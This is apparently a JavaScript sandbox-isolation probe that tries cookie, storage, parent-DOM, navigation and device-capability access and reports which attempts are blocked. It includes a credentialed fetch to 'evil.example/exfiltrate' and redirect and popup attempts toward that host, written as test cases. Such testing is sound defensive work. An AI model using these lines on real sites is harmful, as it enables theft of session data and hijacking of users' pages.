const blocked = "blocked";
const attempts = {
  parentDom: blocked, parentWrite: blocked, cookies: blocked, storage: blocked,
  indexedDb: blocked, form: blocked, popup: blocked, topNavigation: blocked,
  websiteWrite: blocked, undeclaredFetch: blocked, nestedFrame: blocked,
  capabilities: { camera: blocked, microphone: blocked, geolocation: blocked, clipboard: blocked, payment: blocked, usb: blocked },
};

try { document.cookie; if (document.cookie) attempts.cookies = "unexpected"; } catch {}
try { localStorage.getItem("session"); attempts.storage = "unexpected"; } catch {}
try { indexedDB.open("session"); attempts.indexedDb = "unexpected"; } catch {}
try { parent.document.querySelector("#parent-marker"); attempts.parentDom = "unexpected"; } catch {}
try { parent.document.body.innerHTML = "changed"; attempts.parentWrite = "unexpected"; } catch {}
try { if (window.open("https://evil.example")) attempts.popup = "unexpected"; } catch {}
try { top.location.href = "https://evil.example"; attempts.topNavigation = "unexpected"; } catch {}
try { document.createElement("form").submit(); } catch {}
try { document.body.append(document.createElement("iframe")); } catch {}
fetch("http://vibegarden.test:8788/__fixture/write", { method: "POST", credentials: "include" }).then(() => { attempts.websiteWrite = "unexpected"; }).catch(() => {});
fetch("https://evil.example/exfiltrate", { credentials: "include" }).then(() => { attempts.undeclaredFetch = "unexpected"; }).catch(() => {});
const rejectCapability = (key, value) => { if (value) Promise.resolve(value).then(() => { attempts.capabilities[key] = "unexpected"; }).catch(() => {}); };
rejectCapability("camera", navigator.mediaDevices && navigator.mediaDevices.getUserMedia({ video: true }));
rejectCapability("geolocation", navigator.geolocation && new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject)));
rejectCapability("clipboard", navigator.clipboard && navigator.clipboard.readText());
rejectCapability("usb", navigator.usb && navigator.usb.requestDevice({ filters: [] }));
if (window.PaymentRequest) try { rejectCapability("payment", new PaymentRequest([{ supportedMethods: "basic-card" }], { total: { label: "Total", amount: { currency: "USD", value: "1" } } }).show()); } catch {}
setTimeout(() => { parent.postMessage({ type: "artifact-security-attempts", attempts }, "*"); document.body.textContent = "security probe complete"; }, 250);
